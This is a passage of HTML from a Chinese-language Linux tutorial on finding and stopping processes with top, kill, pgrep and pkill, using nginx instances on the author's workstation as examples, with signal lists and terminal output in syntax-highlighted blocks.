</span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12016</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">352</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b6184872098-13\"><span class=\"crayon-cn\">20896</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12460</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1628</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">912</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0087 seconds] -->\r\n<p>在管理进程，特别是终止进程时，正确确定 PID 是非常重要。此外，如果以这种方式使用 <code>top</code>，每当这些进程中的一个停止或一个新进程开始时，<code>top</code> 都需要被告知有新的进程。</p>\n<h3 id=\"toc_11\">终止进程</h3>\n<h4 id=\"toc_12\">KILL</h4>\n<p>有趣的是，没有 <code>stop</code> 命令。在 Linux 中，有 <code>kill</code> 命令。<code>kill</code> 用于向进程发送信号。最常用的信号是“终止”（<code>SIGTERM</code>）或“杀死”（<code>SIGKILL</code>）。然而，还有更多。下面是一些例子。完整的列表可以用 <code>kill -L</code> 显示。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11ba840477970\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP\r\n 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1\r\n11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11ba840477970-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11ba840477970-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11ba840477970-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11ba840477970-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11ba840477970-1\"> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGHUP</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGINT</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGQUIT</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGILL</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGTRAP</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11ba840477970-2\"> <span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGABRT</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGBUS</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGFPE</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGKILL</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGUSR1</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11ba840477970-3\"><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGSEGV</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGUSR2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGPIPE</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGALRM</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SIGTERM</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11ba840477970-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p>注意第 9 号信号是 <code>SIGKILL</code>，通常，我们会发出比如 <code>kill -9 20896</code> 这样的命令。默认信号是 15，这是 <code>SIGTERM</code>。请记住，许多应用程序都有自己的停止方法。Nginx 使用 <code>-s</code> 选项传递信号，如 <code>stop</code> 或 <code>reload</code>。通常，我更喜欢使用应用程序的特定方法来停止操作。然而，我将演示用 <code>kill</code> 命令来停止 Nginx 进程 20896，然后用 <code>pgrep</code> 确认它已经停止。PID 20896 就不再出现。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11be826603649\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ kill -9 20896\r\n \r\nalan@workstation:~$ pgrep nginx\r\n20881\r\n20882\r\n20895\r\n22123</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11be826603649-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11be826603649-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11be826603649-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11be826603649-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11be826603649-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11be826603649-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11be826603649-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11be826603649-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20896</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11be826603649-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d11be826603649-3\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pgrep </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11be826603649-4\"><span class=\"crayon-cn\">20881</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11be826603649-5\"><span class=\"crayon-cn\">20882</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11be826603649-6\"><span class=\"crayon-cn\">20895</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11be826603649-7\"><span class=\"crayon-cn\">22123</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h4 id=\"toc_13\">PKILL</h4>\n<p>命令 <code>pkill</code> 类似于 <code>pgrep</code>，因为它可以按名称搜索。这意味着在使用 <code>pkill</code> 时必须非常小心。在我的 Nginx 示例中，如果我只想杀死一个 Nginx 实例，我可能不会选择使用它。我可以将 Nginx 选项 <code>-s stop</code> 传递给特定的实例来消除它，或者我需要使用 <code>grep</code> 来过滤整个 <code>ps</code> 输出。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11c1198283011\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/home/alan/web/prod/nginx/sbin/nginx -s stop\r\n/home/alan/web/prod/nginxsec/sbin/nginx -s stop</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c1198283011-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11c1198283011-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11c1198283011-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span> <span class=\"crayon-v\">stop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11c1198283011-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginxsec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stop</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>如果我想使用 <code>pkill</code>，我可以包括 <code>-f</code> 选项，让 <code>pkill</code> 过滤整个命令行参数。这当然也适用于 <code>pgrep</code>。所以，在执行 <code>pkill -f</code> 之前，首先我可以用 <code>pgrep -a</code> 确认一下。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11c4176330278\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pgrep -a nginx\r\n20881 nginx: master process ./nginx -p /home/alan/web/prod/nginxsec\r\n20882 nginx: worker process\r\n20895 nginx: master process nginx\r\n20896 nginx: worker process</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c4176330278-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11c4176330278-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c4176330278-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11c4176330278-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c4176330278-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11c4176330278-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11c4176330278-2\"><span class=\"crayon-cn\">20881</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-i\">process</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">nginxsec</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11c4176330278-3\"><span class=\"crayon-cn\">20882</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-i\">process</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11c4176330278-4\"><span class=\"crayon-cn\">20895</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">process </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11c4176330278-5\"><span class=\"crayon-cn\">20896</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-v\">process</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>我也可以用 <code>pgrep -f</code> 缩小我的结果。<code>pkill</code> 使用相同参数会停止该进程。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11c8110571735\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pgrep -f nginxsec\r\n20881\r\n                                           \r\nalan@workstation:~$ pkill -f nginxsec</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c8110571735-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11c8110571735-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11c8110571735-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11c8110571735-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11c8110571735-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nginxsec</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11c8110571735-2\"><span class=\"crayon-cn\">20881</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11c8110571735-3\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span 